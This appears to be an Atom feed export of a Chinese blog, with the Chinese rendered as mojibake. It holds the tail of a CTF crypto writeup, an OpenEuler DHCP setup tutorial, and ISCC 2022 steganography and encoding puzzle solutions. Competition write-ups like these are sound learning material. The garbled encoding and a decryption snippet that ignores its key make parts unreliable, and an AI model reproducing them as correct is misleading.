class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">â‹™</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">â‹˜</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></span></p><p>é‚£ä¹ˆå¯¹åº”çš„è§£å¯†ä»£ç å°±æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypted</span>(<span class="hljs-params">y, key</span>):<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bitslen): <span class="hljs-comment"># bitslenè¡¨ç¤ºä½ è¿›è¡Œè¿ç®—çš„ä½å®½åº¦ï¼Œè¿™é“é¢˜é‡Œé¢å°±æ˜¯32ä½</span><br>y = y ^ cs2r(y, p) ^ cs2l(y, q)<br>key = [k &lt;&lt; <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key]<br><span class="hljs-keyword">return</span> y<br></code></pre></td></tr></table></figure><p>æä¾›å¯¹åº”çš„p,qä¹Ÿæ˜¯å¯ä»¥è§£çš„ã€‚</p><h1 id="ä¸€äº›é¢˜å¤–è¯"><a class="markdownIt-Anchor" href="#ä¸€äº›é¢˜å¤–è¯"></a> ä¸€äº›é¢˜å¤–è¯</h1><p>å¥½å¤šé¢˜ç›®éƒ½æ‰¾ä¸åˆ°writeupï¼Œæ¯æ¬¡æ‰“å®Œä¸€äº›æ¯”èµ›ï¼Œæƒ³çœ‹çœ‹åˆ«äººæ˜¯æ€ä¹ˆå†™å‡ºæ¥é‚£äº›æˆ‘æ²¡å†™å‡ºæ¥çš„é¢˜ï¼Œä½†æ˜¯åŸºæœ¬ä¸Šéƒ½æ‰¾ä¸åˆ°å¯¹åº”çš„Writeupã€‚å®˜æ–¹writeupä¹ŸåŸºæœ¬ä¸Šæ²¡æœ‰ã€‚å“ï¼Œä¹Ÿä¸è®¤è¯†é‚£äº›å¤§ä½¬ï¼Œæƒ³è¦é¢˜è§£éƒ½è¦ä¸åˆ°ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç‰©ç†æœåŠ¡å™¨OpenEulerç³»ç»ŸDHCPç½‘ç»œç¯å¢ƒé…ç½®</title>
    <link href="/2022/05/04/%E7%89%A9%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8OpenEuler%E7%B3%BB%E7%BB%9FDHCP%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2022/05/04/%E7%89%A9%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8OpenEuler%E7%B3%BB%E7%BB%9FDHCP%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>å…³äºTaishan2280ä¸Šçš„openeulerç³»ç»Ÿé…ç½®DHCPåè®®ã€‚</p><span id="more"></span><div class="note note-info">            <p>æœ€åç¼–è¾‘äº2022-05-05</p>          </div><p>å­¦æ ¡æœ‰å°Taishan2280æœåŠ¡å™¨éœ€è¦å®‰è£…æ“ä½œç³»ç»Ÿå¹¶ä¸”é…ç½®ç½‘ç»œã€‚éœ€è¦å®‰è£…çš„ç³»ç»Ÿæ˜¯OpenEulerã€‚æ“ä½œç³»ç»Ÿä½¿ç”¨çš„æ˜¯iBMCæ–¹å¼è¿›è¡Œå®‰è£…ã€‚è¿™é‡Œä¸å†èµ˜è¿°ã€‚</p><p>é¦–å…ˆè¿›å…¥åˆ°æœåŠ¡å™¨ã€‚</p><p>è¯·åœ¨æœåŠ¡å™¨å¯¹åº”çš„ç½‘å£æ’å…¥å¯ä»¥ä½¿ç”¨çš„ç½‘çº¿ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">nmcli dev status<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸Šè¿°å‘½ä»¤æŸ¥çœ‹ç½‘ç»œç¡¬ä»¶è®¾å¤‡ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli dev status<br>DEVICE      TYPE      STATE         CONNECTION<br>enp125s0f0  ethernet  å·²è¿æ¥        web<br>virbr0      bridge    è¿æ¥ï¼ˆå¤–éƒ¨ï¼‰  virbr0<br>enp125s0f1  ethernet  å·²æ–­å¼€        --<br>enp125s0f2  ethernet  å·²æ–­å¼€        --<br>enp125s0f3  ethernet  å·²æ–­å¼€        --<br>lo          loopback  æœªæ‰˜ç®¡        --<br>virbr0-nic  tun       æœªæ‰˜ç®¡        --<br>[root@localhost ~]#<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘çš„enp125s0f0å·²ç»é…ç½®å¥½äº†ã€‚</p><p>é€‰æ‹©TYPEç±»å‹ä¸ºethernetçš„è®¾å¤‡ã€‚è®°å½•ä¸‹å…¶è®¾å¤‡åç§°ã€‚</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">nmcli device connect device_name<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸Šè¿°å‘½ä»¤å¯ç”¨è®¾å¤‡è¿æ¥ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli device connect  enp125s0f1<br>é”™è¯¯ï¼šæ·»åŠ /æ¿€æ´»æ–°è¿æ¥å¤±è´¥ï¼šConnection &#x27;enp125s0f1&#x27; is not available on device enp125s0f1 because device has no carrier<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”±äºæˆ‘çš„ä¸€å·ç½‘å£æ²¡æœ‰æ’ç½‘çº¿è¿™é‡Œæ˜¯å¤±è´¥çš„ã€‚æ‰€ä»¥ä½ éœ€è¦é€‰æ‹©å·²æ’å…¥ç½‘çº¿çš„ç½‘å£ã€‚ç½‘å£é¡ºåºä¸€èˆ¬åœ¨æœåŠ¡å™¨ä¸Šéƒ½æœ‰æ ‡æ³¨ã€‚ç„¶åé€‰æ‹©å¯¹åº”çš„è®¾å¤‡å³å¯ã€‚</p><p>è¿æ¥å®Œæˆåï¼Œä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤å¯ç”¨DHCPã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmcli connection add type ethernet con-name connection-name ifname interface-name<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>connection-name</code> å’Œ <code>interface-name</code>éœ€è¦å¡«å†™è‡ªå·±çš„é…ç½®ã€‚ <code>connection-name</code>å¡«å†™è‡ªå·±çš„ç½‘ç»œé…ç½®åç§°ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªç½‘ç»œé…ç½®ï¼Œå°†ä¼šè‡ªåŠ¨åˆ›å»ºã€‚</p><p><code>interface-name</code>å¡«å†™ä½ åˆšåˆšè¿æ¥çš„ç½‘ç»œè®¾å¤‡ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli connection  add type  ethernet  con-name  web ifname  enp125s0f0<br>Connection &#x27;web&#x27; (fde481a7-0aba-432a-9201-e27603e556e8) successfully added.<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli con show<br>NAME        UUID                                  TYPE      DEVICE<br>web         fde481a7-0aba-432a-9201-e27603e556e8  ethernet  enp125s0f0<br>virbr0      dcce16f4-1934-4663-a2d1-4a908901628e  bridge    virbr0<br>enp125s0f0  a86a2809-b241-4627-9969-9bc95bb42e81  ethernet  --<br>enp125s0f1  dee58f2b-420f-4ab5-9986-66b3315c4616  ethernet  --<br>enp125s0f2  4780278c-90f1-42d5-9dfb-ee9c306e03af  ethernet  --<br>enp125s0f3  2063cbc1-644b-47f9-a151-e9812b2c5ce5  ethernet  --<br></code></pre></td></tr></table></figure><p>è¿™æ ·DHCPæœåŠ¡å°±åœ¨å¯¹åº”çš„è®¾å¤‡å¯ç”¨ã€‚æ¥ä¸‹æ¥åªéœ€è¦Rebootå³å¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">Welcome to 5.10.0-60.18.0.50.oe2203.aarch64<br><br>System information as of time:  2022å¹´ 05æœˆ 04æ—¥ æ˜ŸæœŸä¸‰ 18:46:55 CST<br><br>System load:    0.08<br>Processes:      700<br>Memory used:    2.1%<br>Swap used:      0%<br>Usage On:       8%<br>IP address:     192.168.1.84<br>IP address:     192.168.122.1<br>Users online:   1<br><br><br>[root@localhost ~]#<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„IPåœ°å€å¤šäº†ä¸€ä¸ªã€‚è¿™å°±æˆåŠŸäº†ã€‚å¯¹åº”ç½‘å£å·²ç»åˆ†é…å¾—åˆ°äº†IPã€‚</p><p>122.1é‚£ä¸ªåœ°å€æ˜¯æœåŠ¡å™¨iBMCåœ°å€ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>server</tag>
      
      <tag>OpenEuler</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC 2022</title>
    <link href="/2022/05/03/ISCC-2022/"/>
    <url>/2022/05/03/ISCC-2022/</url>
    
    <content type="html"><![CDATA[<p>ISCC 2022 ä¸­ å•æ¿å°å°†è‹ç¿Šé¸£ã€ è—åœ¨æ˜Ÿç©ºä¸­çš„è¯—ã€é™ç»´æ‰“å‡»ã€2022å†¬å¥¥ä¼šã€çœŸç›¸åªæœ‰ä¸€ä¸ªã€GetTheTableä¸Amyâ€™s Code çš„é¢˜è§£</p><span id="more"></span><p>æ—¶é—´æŒºé•¿çš„ï¼Œä½†æ˜¯æ²¡å•¥æ—¶é—´æ¥ç©ã€‚è¯è¯´ä¸ºä»€ä¹ˆæ²¡æœ‰Cryptoæ–¹å‘çš„</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="å•æ¿å°å°†è‹ç¿Šé¸£"><a class="markdownIt-Anchor" href="#å•æ¿å°å°†è‹ç¿Šé¸£"></a> å•æ¿å°å°†è‹ç¿Šé¸£</h2><p>ä¸‹è½½é™„ä»¶åæ‰“å¼€ï¼Œæ˜¯ä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ªå‹ç¼©åŒ…ã€‚å‹ç¼©åŒ…åŠ å¯†äº†ï¼Œå¾ˆæ˜æ˜¾å¯†ç åº”è¯¥åœ¨å›¾ç‰‡é‡Œã€‚</p><p>å›¾ç‰‡å±æ€§å’Œå‹ç¼©åŒ…æ³¨é‡Šé‡Œé¢éƒ½æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ã€‚ç”¨binwalkå’Œforemostä¹Ÿæ²¡æœ‰åˆ†å‡ºæ¥ä¸œè¥¿ã€‚</p><figure class="highlight less"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">Ih</span>Ã<span class="hljs-selector-tag">EDDDDDDf</span>ï¿½<span class="hljs-selector-tag">t</span>â€˜â‚¬]<span class="hljs-selector-tag">DDDDDDd</span>Â <span class="hljs-selector-tag">A</span>â„¢<span class="hljs-selector-tag">h</span>Ã<span class="hljs-selector-tag">EDDDDDDf</span>ï¿½<span class="hljs-selector-tag">t</span>â€˜â‚¬]<span class="hljs-selector-tag">DDDDDDd</span>Â <span class="hljs-selector-tag">A</span>â„¢<span class="hljs-selector-tag">h</span>Ã<span class="hljs-selector-tag">EDDDDDDf</span>ï¿½<span class="hljs-selector-tag">t</span>â€˜â‚¬]<span class="hljs-selector-tag">DDDDDDd</span>Â <span class="hljs-selector-tag">A</span>â„¢<span class="hljs-selector-tag">h</span>Ã<span class="hljs-selector-tag">EDDDDDDf</span>ï¿½<span class="hljs-selector-tag">t</span>â€˜â‚¬]<span class="hljs-selector-tag">DDDDDDd</span>Â <span class="hljs-selector-tag">A</span>â„¢<span class="hljs-selector-tag">h</span>Ã<span class="hljs-selector-tag">EDDDDDDf</span>ï¿½<span class="hljs-selector-tag">t</span>â€˜â‚¬]<span class="hljs-selector-tag">DDDDDDd</span>Â <span class="hljs-selector-tag">A</span>â„¢<span class="hljs-selector-tag">h</span>Ã<span class="hljs-selector-tag">EDDDDDDf</span>ï¿½<span class="hljs-selector-tag">t</span>â€˜â‚¬]<span class="hljs-selector-tag">DDDDDDd</span>Â <span class="hljs-selector-tag">A</span>â„¢<span class="hljs-selector-tag">h</span>Ã<span class="hljs-selector-tag">EDDDDDDf</span>ï¿½<span class="hljs-selector-tag">t</span>â€˜â‚¬]<span class="hljs-selector-tag">DDDDDDd</span>Â <span class="hljs-selector-tag">A</span>â„¢<span class="hljs-selector-tag">h</span>Ã<span class="hljs-selector-tag">EDDDDDDf</span>ï¿½<span class="hljs-selector-tag">t</span>â€˜â‚¬]<span class="hljs-selector-tag">DDDDDDd</span>Â <span class="hljs-selector-tag">A</span>â„¢<span class="hljs-selector-tag">h</span>Ã<span class="hljs-selector-tag">EDDDDDDf</span>ï¿½<span class="hljs-selector-tag">t</span>â€˜â‚¬]<span class="hljs-selector-tag">DDDDDDd</span>Â <span class="hljs-selector-tag">A</span>â„¢<span class="hljs-selector-tag">h</span>Ã<span class="hljs-selector-tag">EDDDDDDf</span>ï¿½<span class="hljs-selector-tag">t</span>â€˜â‚¬]<span class="hljs-selector-tag">DDDDDDd</span>Â <span class="hljs-selector-tag">A</span>â„¢<span class="hljs-selector-tag">h</span>Ã<span class="hljs-selector-tag">EDDDDDDf</span>ï¿½<span class="hljs-selector-tag">t</span>â€˜â‚¬]<span class="hljs-selector-tag">DDDDDDd</span>Â <span class="hljs-selector-tag">A</span>â„¢<span class="hljs-selector-tag">h</span>Ã<span class="hljs-selector-tag">EDDDDDDf</span>ï¿½<span class="hljs-selector-tag">t</span>â€˜â‚¬]<span class="hljs-selector-tag">DDDDDDd</span>Â <span class="hljs-selector-tag">A</span>â„¢<span class="hljs-selector-tag">h</span>Ã<span class="hljs-selector-tag">EDDDDDDf</span>ï¿½<span class="hljs-selector-tag">t</span>â€˜â‚¬]<span class="hljs-selector-tag">DDDDDDd</span>Â <span class="hljs-selector-tag">A</span>â„¢<span class="hljs-selector-tag">h</span>Ã<span class="hljs-selector-tag">EDDDDDDf</span>ï¿½<span class="hljs-selector-tag">t</span>â€˜â‚¬]<span class="hljs-selector-tag">DDDDDDd</span>Â <span class="hljs-selector-tag">A</span>â„¢<span class="hljs-selector-tag">h</span>Ã<span class="hljs-selector-tag">EDDDDDD</span>Ã¾Ã¤<span class="hljs-selector-tag">t</span>:Ã¿<span class="hljs-selector-tag">q</span>Ëœ<span class="hljs-number">9</span>Ã±Ã¯Ã•ï¿½ï¿½ï¿½ï¿½<span class="hljs-selector-tag">IEND</span>Â®<span class="hljs-selector-tag">B</span>`â€š<br></code></pre></td></tr></table></figure><p>ç”¨äºŒè¿›åˆ¶æŸ¥çœ‹å™¨çœ‹çœ‹é‡Œé¢çš„å†…å®¹ï¼Œå‘ç°å°¾éƒ¨æœ‰ä¸€äº›æ•°æ®æœ‰ç‚¹è§„å¾‹ã€‚è€Œä¸”è¿™ä¸ªæ•°æ®æ˜¯åœ¨å›¾ç‰‡çš„ç»“æŸç¬¦ä¹‹å‰çš„ã€‚æ‰€ä»¥å¯ä»¥çœ‹å‡ºæ¥å›¾åƒè—äº†ä¸œè¥¿ï¼ŒæŠŠå›¾åƒçš„é«˜æ”¹å¤§ä¸€ç‚¹å°±è¡Œã€‚</p><p>æ”¹å®Œä¹‹åå›¾åƒå‡ºç°äº†ä¸€ä¸ªäºŒç»´ç ã€‚æ‰«æã€‚</p><p>å¾—åˆ°å†…å®¹ï¼š</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure"><span class="hljs-character">\u5728</span><span class="hljs-character">\u8fd9</span><span class="hljs-character">\u6b21</span><span class="hljs-character">\u51ac</span><span class="hljs-character">\u5965</span><span class="hljs-character">\u4f1a</span><span class="hljs-character">\u7684</span><span class="hljs-character">\u821e</span><span class="hljs-character">\u53f0</span><span class="hljs-character">\u4e0a</span><span class="hljs-character">\uff0c</span><span class="hljs-character">\u6211</span><span class="hljs-character">\u56fd</span><span class="hljs-character">\u5c0f</span><span class="hljs-character">\u5c06</span><span class="hljs-character">\u82cf</span><span class="hljs-character">\u7fca</span><span class="hljs-character">\u9e23</span><span class="hljs-character">\u65a9</span><span class="hljs-character">\u83b7</span><span class="hljs-character">\u4e00</span><span class="hljs-character">\u91d1</span><span class="hljs-character">\u4e00</span><span class="hljs-character">\u94f6</span><span class="hljs-character">\uff0c</span><span class="hljs-character">\u90a3</span><span class="hljs-character">\u4f60</span><span class="hljs-character">\u77e5</span><span class="hljs-character">\u9053</span><span class="hljs-character">\u6b64</span><span class="hljs-character">\u6b21</span><span class="hljs-character">\u51ac</span><span class="hljs-character">\u5965</span><span class="hljs-character">\u4f1a</span><span class="hljs-character">\u6211</span><span class="hljs-character">\u56fd</span><span class="hljs-character">\u603b</span><span class="hljs-character">\u5171</span><span class="hljs-character">\u83b7</span><span class="hljs-character">\u5f97</span><span class="hljs-character">\u51e0</span><span class="hljs-character">\u679a</span><span class="hljs-character">\u5956</span><span class="hljs-character">\u724c</span><span class="hljs-character">\u5417</span><span class="hljs-character">\uff1f</span><span class="hljs-character">\u53c8</span><span class="hljs-character">\u5206</span><span class="hljs-character">\u522b</span><span class="hljs-character">\u662f</span><span class="hljs-character">\u51e0</span><span class="hljs-character">\u91d1</span><span class="hljs-character">\u51e0</span><span class="hljs-character">\u94f6</span><span class="hljs-character">\u51e0</span><span class="hljs-character">\u94dc</span><span class="hljs-character">\u5462</span><span class="hljs-character">\uff1f</span><br></code></pre></td></tr></table></figure><p>è¿™æ˜¯unicodeç¼–ç ã€‚è½¬æ¢ä¸€ä¸‹å¾—åˆ°ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">åœ¨è¿™æ¬¡å†¬å¥¥ä¼šçš„èˆå°ä¸Šï¼Œæˆ‘å›½å°å°†è‹ç¿Šé¸£æ–©è·ä¸€é‡‘ä¸€é“¶ï¼Œé‚£ä½ çŸ¥é“æ­¤æ¬¡å†¬å¥¥ä¼šæˆ‘å›½æ€»å…±è·å¾—å‡ æšå¥–ç‰Œå—ï¼Ÿåˆåˆ†åˆ«æ˜¯å‡ é‡‘å‡ é“¶å‡ é“œå‘¢ï¼Ÿ<br></code></pre></td></tr></table></figure><p>ç™¾åº¦ä¸€ä¸‹å¥¥è¿å¥–ç‰Œæ¦œã€‚æŒ‰ç…§é¡ºåºè¿›è¡Œç»„åˆã€‚å³å¯å¾—åˆ°å‹ç¼©åŒ…çš„å¯†ç ã€‚è§£å‹å³å¯å¾—åˆ°flagã€‚</p><h2 id="è—åœ¨æ˜Ÿç©ºä¸­çš„è¯—"><a class="markdownIt-Anchor" href="#è—åœ¨æ˜Ÿç©ºä¸­çš„è¯—"></a> è—åœ¨æ˜Ÿç©ºä¸­çš„è¯—</h2><p>ä¸‹è½½é™„ä»¶ã€‚å¾—åˆ°ä¸‰ä¸ªæ–‡ä»¶ã€‚ä¸€ä¸ªpsdæ–‡ä»¶ã€‚ä¸€ä¸ªå‹ç¼©åŒ…ã€‚ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚æ–‡æœ¬æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">1ï¼šâ˜†âœªÙ­â˜ªâœ²<br>2ï¼šâœ¡ğŸŸ‡âŸâŸâœ¸<br>3ï¼šğŸŒ âŸğŸŒŸâœ¡ğŸŸ‰<br>4ï¼šğŸŸƒğŸŸ€âœªğŸŸ€âš<br>5ï¼šâœªğŸŸ”â£â˜†ğŸ±<br></code></pre></td></tr></table></figure><p>emmmâ€¦ å…¨æ˜¯ç‰¹æ®Šå­—ç¬¦ã€‚å‹ç¼©åŒ…å¸¦å¯†ç äº†ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å‹ç¼©åŒ…çš„å¯†ç æ˜¯å¤šå°‘ã€‚</p><p>æ‰“å¼€psdæ–‡ä»¶ã€‚å‘ç°é‡Œé¢æœ‰ä¸¤ä¸ªå›¾å±‚ã€‚ç¬¬ä¸€ä¸ªå›¾å±‚ä¸é€æ˜åº¦ä¸º5%ã€‚è°ƒæ•´åˆ°100%ã€‚å‘ç°äº†ä¸€ä¸ªäº”è§’æ˜Ÿã€‚è¡¨ç¤ºçš„é¡ºåºä¸ºï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>-&gt; <span class="hljs-number">3</span> -&gt; <span class="hljs-number">5</span> -&gt; <span class="hljs-number">2</span> -&gt; <span class="hljs-number">4</span> -&gt; <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æ„æˆä¸€ä¸ªäº”è§’æ˜Ÿã€‚è¿™é‡Œä¸€å¼€å§‹ä»¥ä¸ºæœ€åè¿˜è¦å›åˆ°1ï¼Œåæ¥å‘ç°ä¸ç”¨ã€‚</p><p>å‹ç¼©åŒ…çš„å¯†ç å°±æ˜¯æ–‡æœ¬æ–‡ä»¶ä¸­çš„é‚£å‡ è¡Œæ ‡å·æŒ‰ç…§æç¤ºçš„é¡ºåºç»„åˆã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">â˜†âœªÙ­â˜ªâœ²ğŸŒ âŸğŸŒŸâœ¡ğŸŸ‰âœªğŸŸ”â£â˜†ğŸ±âœ¡ğŸŸ‡âŸâŸâœ¸ğŸŸƒğŸŸ€âœªğŸŸ€âš<br></code></pre></td></tr></table></figure><p>è§£å‹åå¾—åˆ°ä¸€ä¸ªExcelæ–‡ä»¶ã€‚</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs subunit">AÙ­ U<span class="hljs-string">+066</span>D<br>Bâ‰›U<span class="hljs-string">+225</span>B<br>CâŸU<span class="hljs-string">+235</span>F<br>Dâ£U<span class="hljs-string">+2363</span><br>Eâ˜…U<span class="hljs-string">+2605</span><br>Fâ˜†U<span class="hljs-string">+2606</span><br>Gâ˜ªU<span class="hljs-string">+262</span>A<br>HâšU<span class="hljs-string">+269</span>D<br>Iâœ¡U<span class="hljs-string">+2721</span><br>Jâœ¦U<span class="hljs-string">+2726</span><br>Kâœ§U<span class="hljs-string">+2727</span><br>LâœªU<span class="hljs-string">+272</span>A<br>Mâœ«U<span class="hljs-string">+272</span>B<br>Nâœ®U<span class="hljs-string">+272</span>E<br>Oâœ¯U<span class="hljs-string">+272</span>F<br>Pâœ´U<span class="hljs-string">+2734</span><br>QğŸŒŸU<span class="hljs-string">+1</span>F31F<br>RğŸŸŒU<span class="hljs-string">+1</span>F7CC<br>SğŸŸ‡U<span class="hljs-string">+1</span>F7C7<br>TğŸŒ U<span class="hljs-string">+1</span>F320<br>UğŸŸ‰U<span class="hljs-string">+1</span>F7C9<br>VğŸŸ€U<span class="hljs-string">+1</span>F7C0<br>WğŸŸƒU<span class="hljs-string">+1</span>F7C3<br>XğŸŸ†U<span class="hljs-string">+1</span>F7C6<br>YğŸŸU<span class="hljs-string">+1</span>F7D0<br>ZğŸŸ”U<span class="hljs-string">+1</span>F7D4<br>=âœ²U<span class="hljs-string">+2732</span><br>&#123;âœ¸U<span class="hljs-string">+2738</span><br>&#125;ğŸ±U<span class="hljs-string">+1</span>F7B1<br><br></code></pre></td></tr></table></figure><p>ç„¶åæŠŠæ–‡æœ¬æ–‡ä»¶é‡Œé¢çš„å­—ç¬¦æŒ‰ç…§è¡¨é‡Œç»™çš„å¯¹åº”è‹±æ–‡å­—æ¯æ›¿æ¢å³å¯ã€‚æœ€åç»“æœä¸ºï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span>ï¼šFLAG<span class="hljs-operator">=</span><br><span class="hljs-number">2</span>ï¼šISCC&#123;<br><span class="hljs-number">3</span>ï¼šTCQIU<br><span class="hljs-number">4</span>ï¼šWVLVH<br><span class="hljs-number">5</span>ï¼šLZDF&#125;<br></code></pre></td></tr></table></figure><h2 id="é™ç»´æ‰“å‡»"><a class="markdownIt-Anchor" href="#é™ç»´æ‰“å‡»"></a> é™ç»´æ‰“å‡»</h2><p>è¿™é¢˜å†™çš„æˆ‘çœŸçš„æ˜¯å¾ˆéš¾å—ã€‚æœ€åä¸€éƒ¨åˆ†æ•´äº†åŠå¤©ã€‚</p><p>flagæ ¼å¼ï¼šISCC{xxxx-xxxx-xxxx}</p><p>é¦–å…ˆä¸‹è½½é™„ä»¶ï¼Œè§£å‹å¾—åˆ°ä¸€ä¸ªå›¾ç‰‡ã€‚</p><p><img src="https://s2.loli.net/2022/05/02/pbCsNHajOFcqfyY.png" alt="misc-DimensionalityReductionStrike-19" /></p><p>å•Šï¼Œæ˜¯ä¼Šé›·å¨œã€‚</p><p>ç”¨binwalkçœ‹çœ‹æœ‰æ²¡æœ‰æ–‡ä»¶ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">â””â”€$ binwalk misc-DimensionalityReductionStrike-19.png <br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             PNG image, 1192 x 1656, 8-bit colormap, non-interlaced<br>882           0x372           Zlib compressed data, best compression<br>290500        0x46EC4         PNG image, 200 x 400, 8-bit/color RGB, non-interlaced<br>290541        0x46EED         Zlib compressed data, default compression<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯æœ‰ä¸œè¥¿çš„ã€‚æœ‰ä¸€ä¸ª200*400å¤§å°çš„å›¾åƒæ–‡ä»¶ã€‚ä½†æ˜¯binwalkæä¸å‡ºæ¥â€¦æ‰€ä»¥å°±æ¢foremostæ¥æäº†ã€‚</p><p><img src="https://s2.loli.net/2022/05/02/sulnctUJ14kD2O5.png" alt="00000567" 